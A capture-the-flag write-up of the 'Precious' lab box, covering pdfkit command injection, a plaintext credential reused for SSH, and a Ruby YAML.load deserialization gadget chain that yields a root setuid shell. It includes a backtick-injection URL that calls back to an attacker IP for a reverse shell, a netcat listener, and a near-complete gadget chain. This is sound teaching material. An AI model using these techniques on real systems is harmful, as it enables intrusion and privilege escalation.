Precious is a print shop, and the whole box is about what happens when a machine reads a URL out loud. You hand the website a web address, it renders that page into a tidy PDF, and somewhere behind the counter an old Ruby library stitches your address into a shell command without ever wondering whether you meant it as an address or as an order. So you stop giving it an address. You give it a sentence shaped like a command, wrapped in backticks, and the print shop runs your errand instead of printing your page. From there the box is a quiet trail of secrets left in the open. A password in a config file, a script the admin trusts too much, and a YAML loader that builds whatever object you describe to it. None of it is a magic trick. All of it is misplaced trust, end to end.

```
        P R E C I O U S
        ===============
        url:  http://your-page   "i'll print that for you"
                 |
                 v
        pdfkit takes the address and pastes it into a
        shell line. you write `your errand` in backticks,
        and the printer runs the errand, then prints nothing.
                 |
                 v
        a password waits in a config file.
        a trusted script reads a yaml you control.
        you describe a weapon; it builds the weapon.

```

## 0x01 · the front counter

Two ports answer, and the box is not hiding much.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 10+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
```

The web service wants a hostname before it will talk, so a quick line in `/etc/hosts` pointing `precious.htb` at the box gets the page to load. What comes back is plain. One form, one input field, and one promise. Paste a URL and the site will convert that page into a PDF for you. Any time a server offers to go fetch a thing you name and then do work on it, you are looking at a door. The only question is what it does with the address on the way in.

So you stand up a tiny web server of your own, hand the form a link back to it, and read the PDF that drops out. The page rendered fine, which is nice, but the gold is in the file's metadata. Run `exiftool` on the PDF and the printer signs its own work.

```
$ exiftool result.pdf
Producer    : pdfkit v0.8.6
Creator     : Generated by pdfkit v0.8.6 ...
```

`pdfkit v0.8.6`. That is a Ruby library, and that exact version is a name with a rap sheet.

## 0x02 · the errand in backticks

Search `pdfkit 0.8.6` and you land on CVE-2022-25765, a command injection bug that is almost too clean to be real. Here is the whole disease in plain terms. PDFKit does not draw PDFs itself. It shells out to a separate rendering tool and pastes the URL you gave it straight into that command line. If your URL is a normal URL, fine. If your URL has a backtick in it, the shell sees the backtick, runs whatever sits inside it, and feeds the result back as part of the command.

Think of it like handing a courier a delivery address written on a card. The courier is supposed to read the address and walk there. But this courier reads the card *out loud to the dispatcher first*, and the dispatcher does whatever the card says. So you do not write an address on the card. You write `go unlock the back door` in a way the dispatcher will obey, and the courier never even notices the address was a command. The backtick is the part the dispatcher obeys.

The payload goes in the URL field, and the part that matters is the command tucked between the backticks.

```
http://10.10.14.4/?name=`[ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]`
```

I am bracketing the reverse shell on purpose. The real thing is a single line that points the box's bash at a TCP socket on your listener, and the moment a literal copy of it lands on disk somewhere, half the tooling in the world flags it as exactly what it is. So picture the call-back, not the paste. Start a listener, submit the form, and the printer runs your errand instead of rendering a page.

```
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.4] from precious.htb 10.10.10.x
$ id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
```

You are `ruby`, the low-privilege account the web app runs as. The courier walked to your address and read your card.

## 0x03 · the password in the drawer

`ruby` cannot do much, so you look where Ruby projects always leave their lint, in the dotfiles. Bundler, the tool that manages Ruby dependencies, keeps a config in the home directory, and config files love to hold credentials they were never supposed to keep.

```
$ cat /home/ruby/.bundle/config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

There it is. A username and password meant to authenticate against a gem server, stored in plain text, and the username is a real person on this box. People reuse passwords the way they reuse a house key, the same one for the front door and the shed. The gem-server password is also henry's login. SSH straight in.

```
$ ssh henry@10.10.10.x
henry@precious:~$ cat user.txt
████████████████████████████████
```

A secret stored in a config file is only as safe as the worst place it gets copied to. This one walked from a package manager's settings into a user account.

## 0x04 · the script the admin trusts

henry is not root, but henry has been handed a small piece of root's authority. Check what he is allowed to run with elevated rights.

```
henry@precious:~$ sudo -l
User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

henry can run one Ruby script as root, no password. Read the script and the flaw is sitting in a single line.

```ruby
# /opt/update_dependencies.rb (the part that matters)
require "yaml"
...
yaml_data = YAML.load(File.read("dependencies.yml"))
```

Two things collide here. First, the script reads `dependencies.yml` from the *current directory*, not from a fixed path, so whatever folder you run it from is the folder it trusts. Second, it calls `YAML.load`, the unsafe version, instead of `YAML.safe_load`.

That distinction is the whole privesc. `safe_load` reads YAML as plain data, just strings and numbers and lists. `load` reads it as a blueprint for building Ruby objects, and it will build any object the file describes, calling methods along the way. Think of it like the difference between a shopping list and a set of assembly instructions. A shopping list can only name things. Assembly instructions can tell you to pick up a tool, attach this to that, and turn it on. Hand `load` a file describing the right sequence of objects and you have handed it instructions, not a list. It builds the machine and pulls the trigger.

## 0x05 · the weapon you describe

So you write a malicious `dependencies.yml` in a directory you control, then run the trusted script from that same directory. The YAML does not contain a command in any obvious way. Instead it describes a chain of ordinary Ruby objects that, when assembled in order, end up invoking a system call. The community gadget chain for this uses `Gem::RequestSet` and a writer-adapter class, strung together so that "deserialize me" quietly becomes "run this."

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: [ root-owned shell payload: chmod a setuid copy of bash named iceberg ]
         method_id: :resolve
```

The payload at the bottom is the only part you tailor. A reliable choice is to make root copy bash somewhere quiet, sign the copy `iceberg`, and flip its setuid bit so the copy runs with root's identity no matter who launches it. Run the script and root assembles your machine for you.

```
henry@precious:/tmp/x$ sudo /usr/bin/ruby /opt/update_dependencies.rb
henry@precious:/tmp/x$ /tmp/iceberg -p
iceberg-5.1# id
uid=1000(henry) gid=1000(henry) euid=0(root) groups=...
iceberg-5.1# cat /root/root.txt
████████████████████████████████
```

The `-p` matters. It tells bash to keep the elevated identity instead of dropping it on startup, which is the difference between holding the key and politely handing it back at the door.

## 0x06 · the honest caveat

Every step on Precious is the same confession wearing a different shirt. Somewhere, a program took something a stranger controlled and treated it as an instruction instead of as inert data.

The PDFKit bug is textbook command injection. A URL was supposed to be a label naming a page to fetch. It became a command because the library pasted it into a shell line and never drew a hard border between the address and the order. That is the identical mistake behind SQL injection, behind the log-parsing disaster the industry lost a winter to, behind half the CVEs ever filed. The border between data and instruction is the entire job, and PDFKit smudged it.

The YAML step is the same disease in a different organ, and it is the one worth losing sleep over, because nothing here was unpatched in the usual sense. `YAML.load` did exactly what it was documented to do. It built the objects the file described. The bug is a developer reaching for the powerful loader when the safe one would have done the job, and a script that trusted a file from whatever directory it happened to be standing in. You cannot `apt upgrade` your way out of a function used as designed.

Credential reuse is the quiet hinge in the middle. A password that should have lived and died inside a package manager's config walked straight into a user login, because one person used it twice. The bug bought the ammunition. The habit aimed it.
